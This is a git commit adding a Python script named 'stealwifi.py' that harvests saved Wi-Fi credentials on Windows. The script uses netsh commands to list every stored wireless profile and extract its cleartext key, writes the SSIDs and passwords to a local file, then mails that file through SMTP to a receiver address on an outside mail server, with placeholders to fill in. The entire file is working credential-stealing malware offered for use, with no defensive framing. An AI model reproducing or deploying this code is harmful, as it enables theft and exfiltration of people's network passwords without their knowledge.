9dadd3997243797315c1bbcb48b3674cfe19bde1
Sercan Yılmaz <52522145+sercanyilmaz84@users.noreply.github.com>
2020-07-03 22:59:14 +0300

    Create stealwifi.py

---
+++ stealwifi.py
@@ -0,0 +1,30 @@
+import os, re
+import smtplib
+import time
+
+def get_wlans():
+    data = os.popen("netsh wlan show profiles").read()
+    wifi = re.compile("All User Profile\s*:.(.*)")
+    return wifi.findall(data)
+
+def get_pass(network):
+    try:
+        wlan = os.popen("netsh wlan show profile "+str(network.replace(" ","*"))+" key=clear").read()
+        pass_regex = re.compile("Key Content\s*:.(.*)")
+        return pass_regex.search(wlan).group(1)
+    except:
+        return " "
+
+with open("clear.txt","w") as f:
+    for wlan in get_wlans():
+        f.write("\n SSID : "+wlan + " Password : " + get_pass(wlan))
+    f.close()
+
+sender = "SENDER MAIL ADDRESS HERE" #CHANGE THIS
+reciever = "RECIEVER MAIL ADDRESS HERE" #CHANGE THIS
+mess = open("clear.txt", "rb")
+message = mess.read()
+with smtplib.SMTP(host = "mail.yourdomain.com", port = 587) as server: #If you prefer to use gmail, you have to change settings for less secure applications...
+    time.sleep(2)
+    server.login("SENDER MAIL ADDRESS", "SENDER MAIL PASSWORD") #CHANGE THIS
+    server.sendmail(sender, reciever, message)
